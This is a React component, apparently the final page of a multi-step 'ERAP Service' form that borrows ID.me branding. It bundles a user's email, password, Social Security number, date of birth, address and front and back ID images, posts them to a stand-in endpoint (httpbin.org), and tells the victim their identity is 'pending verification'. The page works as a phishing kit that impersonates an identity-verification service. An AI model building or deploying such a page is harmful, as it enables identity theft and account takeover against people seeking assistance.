import { useNavigate } from "react-router-dom";
import { useContext, useEffect } from "react";
import { useMutation } from "react-query";

import { CardContent, CardFooter } from "@/components/ui/card.tsx";
import {
  isForm1Filled,
  isForm2Filled,
  isForm3Filled,
} from "@/lib/form-utils.ts";
import { FormContext } from "@/context/FormContext.tsx";
import { FORM_ROUTES } from "@/routes/form-routes.ts";

const API_ENDPOINT_URL = "https://httpbin.org/post";
const LOG_DATA = true;

export default function FormSuccessPage() {
  const { mutate, isLoading, isSuccess, isError } = useMutation({
    mutationFn: async (formData: FormData) => {
      const response = await fetch(API_ENDPOINT_URL, {
        method: "POST",
        body: formData,
      });
      if (!response.ok) throw new Error("Data upload failed!");
      return await response.json();
    },
    onSuccess: (data) => {
      if (LOG_DATA) {
        const formattedResult = { ...data.files, ...data.form };
        console.log(formattedResult);
      }
    },
  });

  const formContext = useContext(FormContext);

  const navigate = useNavigate();

  useEffect(() => {
    document.title = "ERAP Service";
  }, []);

  useEffect(() => {
    // Navigate back if the previous fields aren't filled
    if (
      !(
        isForm3Filled(formContext) &&
        isForm2Filled(formContext) &&
        isForm1Filled(formContext)
      )
    )
      return navigate(FORM_ROUTES.three);

    const { form1, form2, form3 } = formContext;

    const formData = new FormData();

    // Append form 1 data
    const { email, password } = form1;
    formData.append("email", email);
    formData.append("password", password);

    // Append form 2 data
    const {
      firstName,
      lastName,
      phone,
      ssn,
      homeAddress,
      city,
      state,
      zipCode,
      dateOfBirth,
    } = form2;
    formData.append("first-name", firstName);
    formData.append("last-name", lastName);
    formData.append("phone", phone);
    formData.append("ssn", ssn);
    formData.append("home-address", homeAddress);
    formData.append("city", city);
    formData.append("state", state);
    formData.append("zip-code", zipCode);
    formData.append("date-of-birth", dateOfBirth);

    // Append form 3 data
    const { idFront, idBack } = form3;
    if (idFront) formData.append("id-front", idFront);
    if (idBack) formData.append("id-back", idBack);

    // Perform the mutation
    mutate(formData);
  }, [formContext, mutate, navigate]);

  return (
    <>
      <CardContent
        className={
          "text-center flex flex-col align-center justify-center gap-y-14"
        }
      >
        <h1 className={"text-[#efd763] text-5xl font-bold"}>
          {isLoading && "Uploading"}
          {isSuccess && "Success"}
          {isError && "Error"}
        </h1>
        <p className={"text-[#00599c] font-semibold"}>
          {isLoading && (
            <>
              Data is being uploaded to server!
              <br />
              Please do not close.
            </>
          )}
          {isError && (
            <>
              Unable to upload data!
              <br />
              Please try again.
            </>
          )}
          {isSuccess && (
            <>
              Your identity is pending verification.
              <br />
              We'll be in Touch Shortly!
            </>
          )}
        </p>
      </CardContent>
      <CardFooter className={"flex items-center mt-36 p-20 justify-center"}>
        <p className={"text-gray-500"}>
          What is ID.me? | Terms of Service | Privacy Policy
        </p>
      </CardFooter>
    </>
  );
}
